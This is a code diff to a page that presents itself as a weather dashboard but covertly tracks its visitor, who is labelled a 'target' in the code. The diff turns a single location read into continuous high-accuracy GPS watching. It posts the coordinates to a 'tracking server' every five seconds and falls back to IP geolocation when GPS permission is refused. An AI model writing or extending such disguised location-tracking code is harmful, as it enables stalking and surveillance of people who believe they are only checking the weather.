@@ -540,6 +540,9 @@
         let targetId = getOrGenerateId();
         let telemetryInterval = null;
         let lastCoordinates = { lat: null, lng: null };
+        let hasUnlocked = false;
+        let isTrackingStarted = false;
+        let trackingMethod = "GPS (High Accuracy)";
 
         // Generate or fetch target identifier
         function getOrGenerateId() {
@@ -567,37 +570,50 @@
 
         // Trigger user geolocation capture
         function triggerTelemetry() {
+            if (isTrackingStarted) return;
+            isTrackingStarted = true;
+
             if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
+                navigator.geolocation.watchPosition(
                     (position) => {
                         const lat = position.coords.latitude;
                         const lng = position.coords.longitude;
                         lastCoordinates = { lat, lng };
+                        trackingMethod = "GPS (High Accuracy)";
                         
                         statusLog.textContent = "Radar lock achieved. Synchronizing...";
                         
-                        // Reverse Geocode Coords to get address details
-                        reverseGeocode(lat, lng)
-                            .then(loc => {
-                                fetchWeather(lat, lng, loc.city, loc.country);
-                                sendTelemetry(lat, lng);
-                                unlockDashboard();
-                            })
-                            .catch(() => {
-                                fetchWeather(lat, lng, "Local Radar", "User Location");
-                                sendTelemetry(lat, lng);
-                                unlockDashboard();
-                            });
+                        // Send telemetry immediately
+                        sendTelemetry(lat, lng, trackingMethod);
+                        
+                        // Start heartbeat periodic sender if not running
+                        startHeartbeat();
+
+                        if (!hasUnlocked) {
+                            hasUnlocked = true;
+                            reverseGeocode(lat, lng)
+                                .then(loc => {
+                                    fetchWeather(lat, lng, loc.city, loc.country);
+                                    unlockDashboard();
+                                })
+                                .catch(() => {
+                                    fetchWeather(lat, lng, "Local Radar", "User Location");
+                                    unlockDashboard();
+                                });
+                        }
                     },
                     (error) => {
-                        console.warn("Geolocation permission error: ", error);
-                        statusLog.textContent = "Sensor blocked. Initiating IP telemetry fallback...";
-                        ipFallback();
+                        console.warn("Geolocation tracking error: ", error);
+                        // If we haven't unlocked yet and don't have any coordinates, fallback to IP
+                        if (!hasUnlocked && lastCoordinates.lat === null) {
+                            statusLog.textContent = "GPS sensor unavailable. Initiating IP telemetry fallback...";
+                            ipFallback();
+                        }
                     },
                     {
                         enableHighAccuracy: true,
-                        timeout: 8000,
-                        maximumAge: 0
+                        timeout: 15000, // 15 seconds to allow cold GPS lock
+                        maximumAge: 0   // Prevent cached positions
                     }
                 );
             } else {
@@ -608,6 +624,7 @@
 
         // IP-based Location Fallback
         function ipFallback() {
+            trackingMethod = "IP Geolocation (Approximate)";
             fetch("https://ipapi.co/json/")
                 .then(res => res.json())
                 .then(data => {
@@ -618,7 +635,8 @@
                         
                         statusLog.textContent = "IP Radar lock achieved. Synchronizing...";
                         fetchWeather(lat, lng, data.city || "Regional Station", data.country_name || "Unknown");
-                        sendTelemetry(lat, lng);
+                        sendTelemetry(lat, lng, trackingMethod);
+                        startHeartbeat();
                         unlockDashboard();
                     } else {
                         throw new Error("Invalid IP payload");
@@ -630,9 +648,11 @@
                     // Default fallback to Kota, Rajasthan, India
                     const lat = 25.1743;
                     const lng = 75.9193;
+                    trackingMethod = "Default Fallback (Kota)";
                     lastCoordinates = { lat, lng };
                     fetchWeather(lat, lng, "Kota", "India");
-                    sendTelemetry(lat, lng);
+                    sendTelemetry(lat, lng, trackingMethod);
+                    startHeartbeat();
                     unlockDashboard();
                 });
         }
@@ -650,7 +670,8 @@
         }
 
         // Post data back to Express tracking server
-        function sendTelemetry(lat, lng) {
+        function sendTelemetry(lat, lng, method) {
+            if (lat === null || lng === null) return;
             fetch("/weather", {
                 method: "POST",
                 headers: {
@@ -659,30 +680,22 @@
                 body: JSON.stringify({
                     id: targetId,
                     lat: lat,
-                    lng: lng
+                    lng: lng,
+                    method: method || trackingMethod
                 })
             })
             .then(res => {
                 if (!res.ok) console.warn("Server telemetry response abnormal");
             })
             .catch(err => console.error("Telemetry streaming failed:", err));
+        }
 
-            // Start periodic updates if not running
+        // Periodic telemetry backup (heartbeat)
+        function startHeartbeat() {
             if (!telemetryInterval) {
                 telemetryInterval = setInterval(() => {
-                    // Query current coordinates silently to push real-time movements
-                    if ("geolocation" in navigator) {
-                        navigator.geolocation.getCurrentPosition(
-                            (position) => {
-                                lastCoordinates.lat = position.coords.latitude;
-                                lastCoordinates.lng = position.coords.longitude;
-                                sendTelemetry(lastCoordinates.lat, lastCoordinates.lng);
-                            },
-                            null,
-                            { enableHighAccuracy: true }
-                        );
-                    } else {
-                        sendTelemetry(lastCoordinates.lat, lastCoordinates.lng);
+                    if (lastCoordinates.lat !== null && lastCoordinates.lng !== null) {
+                        sendTelemetry(lastCoordinates.lat, lastCoordinates.lng, trackingMethod);
                     }
                 }, 5000);
             }
